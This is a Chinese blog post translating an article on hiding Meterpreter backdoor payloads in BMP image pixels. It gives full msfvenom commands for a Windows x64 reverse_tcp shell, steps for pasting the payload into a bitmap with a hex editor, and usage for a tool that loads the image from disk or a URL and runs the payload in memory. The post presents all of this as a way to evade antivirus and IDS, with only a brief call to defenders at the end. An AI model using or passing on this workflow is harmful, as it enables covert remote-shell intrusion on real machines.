---
layout: post
title:  "用BMP图像像素传输后门有效载荷(翻译)"
date:   2017-07-05 16:12:16 +0800
categories: security
---

无意间在网上看到老外写的一篇关于bmp图片隐写的技术文章，写的通俗易懂，方法也很简单，所以想通过简单的翻译一下，熟悉下markdown。只翻译了文章的主要结构，原文请参见文章底部链接。

现在我们讨论的通过BMP图像像素传输后门有效载荷的方法，你可以测试它是否可以bypass反病毒软件或者IPS/IDS


正如你所看到的图片1，图片是黑色的背景加上红色的线，你有从图片中发现有什么错误的或者不正常的地方吗？

![图片1](https://github.com/angyzh/angyzh.github.io/blob/master/images/bmp1.png?raw=true)  
图片1

图片2向你展示了图片中不正常的地方

![图片2](https://github.com/angyzh/angyzh.github.io/blob/master/images/bmp2.png?raw=true)  
图片2 恶意软件的有效载荷注入在图片像素的后面


看到这里我想讨论一下为什么这么做是有危害的和你怎样才能做到这一点？

# 重要的问题:
- 为什么通过图片传输有效载荷或数据是危险的？
- 	很不幸的是,没有人认为这种方式是重要的威胁  
- 在此之前你是否用反病毒软件扫描过bmp文件？  
- 你是否用反病毒软件实时检测和扫描过bmp文件？  
- 多个反病毒软件可以检测到这种威胁？  
- 我们应该怎样检测这么威胁，当一个bmp文件放在一个目标网站或者被感染的网站？  
- 这种方式可以用作web攻击吗？或者我们可以用这么方式bypass WAF(web应用防火墙)从bmp中读取有效载荷从而进行web攻击？  
- 对于web或者网络渗透，传输有效载荷或数据的最好方式之一就是通过80或443端口,尤其是80端口，在bmp文件中有没有有效载荷加密(重要)  
- 有多少防火墙或者IPS/IDS工具可以检测到这种技术  
- 如果用这种技术将后门的有效载荷加密在图片中，谁可以检测出来，怎样检测处理？或者如果我使用这种技术通过分块BMP文件，
这意味着将有效载荷分割成多于1个图片文件，那么哪种AV可以检测到这种有效载荷的传递？  


# 我们应该怎么做？
首先我想通过一个简单的小例子讨论我们怎样手工的去做然后在通过我写的C#代码怎样去做到。我也会解释我的工具的使用。

在这种情况下我想通过增加或修改像素的方式将有效载荷注入到bmp文件中(只针对bmp文件)

因为每个像素都由RGB码组成，所以我们应该将有效载荷注入到每个像素的RGB码中，我们有了类似于下面的步骤：

Code Behind Pixels
Pixel 1 = R(112) , G(255) , B(10)
Pixel 2 = R(192) , G(34) , B(84)
Pixel 3 = R(111) , G(0) , B(190)

因此我们有了RGB有效载荷 112,255,10,192,34,84,111,0,190

Decimal == hex 112 == 70 255 == ff 10 == 0A 192 == C0 34 == 22 84 == 54 111 == 6F 0 == 00 190 == BE

因此我们的像素有了Meterpreter有效载荷: 70FF0AC022546F00BE

正如你所看到的图片3，我们有每个像素对应的16进制、10进制和颜色

![图片3](https://github.com/angyzh/angyzh.github.io/blob/master/images/rgb.png?raw=true)  
图片3

现在你可以理解怎么样做和改变bmp文件的哪个位置去创建一种注入方式

# 手动一步一步的注入Meterpreter 有效载荷到bmp文件中

这一节中我想讨论怎样手动的一步步去做这件事件

 **第一步**: 我们需要一个bmp文件，你需要用到MSPaint(微软自带的画图工具)
注意：做这一个步只能用微软自带的画图工具MSPaint

正如你所看到的图片4，我们有一个空白的700*2像素的bmp文件

![图片4](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic4.png?raw=true)  
图片4

你可以保存文件为(24-bit bitmap)颜色格式  

 **第二步**: 在Kail linux中创建一个Meterpreter有效载荷用以下其中一个命令：
- msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f c > payload.txt
- msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f num > payload.txt

 **第三步**: 用Hexeditor NEO工具将生成的有效载荷注入到第一步保存的bmp文件中
 
 在图片5中,你可以看到bmp文件没有修改之前在hexexitor NEO中的样子
 
![图片5](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic5.png?raw=true)  
图片5

现在在图片6中你可以看到3个像素其中的有效载荷表示为“70FF0A" "C02254" "6F00BE”

![图片6](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic6.png?raw=true)  
图片6

你可以看到当我们把有效载荷注入到bmp文件中发生的变化

这样做：你应该用16进制编辑器编辑bmp文件像图片7，此时通过复制粘贴将有效载荷注入到文件偏移0x36的位置到结束。
偏移0x36之前是bmp文件头，在图片5中看到的绿色线圈起来的部分。

- 注意：改变bmp文件之前，你应该将有效载荷中的类似0xfc改成fc,你的有效载荷应该想图片9那样(很重要)

现在将你的有效载荷从“pay.txt”复制粘贴到bmp文件的偏移0x36的位置,像图片7和图片8

![图片7](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic7.png?raw=true)  
图片7

有效载荷以FC48开始，FFD5结束，图片8中高亮的绿色区域

![图片8](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic8.png?raw=true)  
图片8

现在保存文件

下面的步骤类似于图片9，你有了一个注入Meterpreter有效载荷的bmp文件

![图片9](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic9.png?raw=true)  
图片9

正如你所看到的，我们有了一个拥有更多像素的bmp文件

#### Meterpreter有效载荷需要多少个像素

如果我们的有效载荷为510个字节，那么我们需要170个像素
- 510 Bytes payload , 3 is 1 byte for each : R + G + B ==> 1+1+1  
510 / 3 = 170 Pixels  
it means 0 …. 169 Pixels in MS Paint like picture 10.

![图片10](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic10.png?raw=true)  
图片10

之后你需要一些代码来读取bmp文件中的有效载荷

我写了一个c#程序用来从bmp文件中读取有效载荷并在内存中执行，就像后门一样。用我的工具你可以创建一个新的包含有效载荷的bmp文件
，我的工具还可以创建一个web服务端使你可以url下载bmp文件并执行隐藏在bmp中的代码在内存中。未来我的工具还会支持加密功能，将
有效载荷加密后注入到bmp文件中

#使用NativePayload_Image.exe一步步执行bmp文件中的有效载荷

- **第一步**：如果你想知道使用NativePayload_Image.exe程序的用法，你可以不输入任何参数直接运行，如图片11：

![图片11](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic11.png?raw=true)  
图片11

使用我的代码，你可以使用此语法为本地BMP文件提供非常简单的Meterpreter会话。

想要这个工具开启后门模式，你需要使用下面的用法
- NativePayload_Image.exe bitmap “filename.bmp” [Meterpreter_payload_Length] [Header_Length]
- NativePayload_Image.exe bitmap “filename.bmp”  510  54﻿

注意：Meterpreter的有效载荷长度为510字节(通过msfvenom工具的"-f C" 或者 "-f num"参数)
注意：bmp文件头的长度总是为54字节

![图片12](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic12.png?raw=true)  
图片12

如图12，我们有了一个meterpreter会话

#总结
我们可以创建一个带有meterpreter有效载荷的的bmp文件，然后使用我的c#程序执行bmp文件中的有效载荷

**第二步**：使用工具创建注入bmp文件的有效载荷
- msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f c > payload.txt
- msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 -f num > payload.txt

注意：你应该改变的你有效载荷像图13一样
注意：改变” 0xfc , 0x48 , 0x83 “ 为 “fc,48,83, ...”

![图片13](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic13.png?raw=true)  
图片13

现在，如图14，你可以创建一个新得bmp文件

![图片14](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic14.png?raw=true)  
图片14

用法如下：
- NativePayload_Image.exe create “Newfilename.bmp” [Meterpreter_payload]
- NativePayload_Image.exe create “Newfilename.bmp” fc,48,83,....

**第三步**：注入Meterpreter有效载荷到已存在的bmp文件
你需要一个bmp文件，如图15：

![图片15](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic15.png?raw=true)  
图片15

修改文件的用法如下：
- NativePayload_Image.exe modify “Existfilename.bmp” [header_length] [Meterpreter_payload]
- NativePayload_Image.exe modify “Existfilename.bmp”  54  fc,48,83,....

![图片16](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic16.png?raw=true)  
图片16

修改文件只有，放大到300%可以看到我们的有效载荷在下面的黑色背景,看下一个图片，修改的bmp文件
可以很好的工作

这一次我们从web站点上下载这个bmp文件。我们用MyBMP_to_Modify.bmp文件(之前创建的文件)。在Kail linux中创建
一个web-server来提供bmp的文件下载

**第四步**：通过url从web站点下载bmp文件

用法如下：
-  NativePayload_Image.exe url “Url” [Meterpreter_payload_Length] [Header_Length]
- NativePayload_Image.exe url "https://192.168.59.2:8000/MyBMP_to_Modify.bmp"  510   54

![图片17](https://github.com/angyzh/angyzh.github.io/blob/master/images/pic17.png?raw=true)  
图片17

最后，这个技术不是新的，但我认为目前没有人关心这个威胁，但这真的很危险。 我们应该特别检查我们的防病毒，因为它也可以在BMP文件中使用加密的有效载荷，然后对于大多数AV来说它真的不可检测。 或者有效载荷可以分块到多个BMP文件中，然后它比没有任何混淆更危险，我认为默认情况下，大多数AV不会实时扫描BMP扩展文件或文件系统手动扫描。 另外我不认为他们可以检测BMP文件中的这个有效载荷（应该逐个检查AV），如果有人使用这种技术进行渗出，意味着传输数据（不使用BMP文件中的后门有效载荷，但只是 在BMP文件中添加数据），那么我们可以做什么作为捍卫者，以及如何检测这种渗出方法？ （现在检查你的AV）



原文连接: [Transferring Backdoor Payloads with BMP Image Pixels][src-url]

[src-url]:  https://www.peerlyst.com/posts/transferring-backdoor-payloads-with-bmp-image-pixels-damon-mohammadbagher?utm_source=twitter&utm_medium=social&utm_content=peerlyst_post&utm_campaign=peerlyst_resource

推荐一篇关于利用JPEG文件格式隐藏payload的文章 [here][here]

[here]:https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8JPEG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8Fpayload/


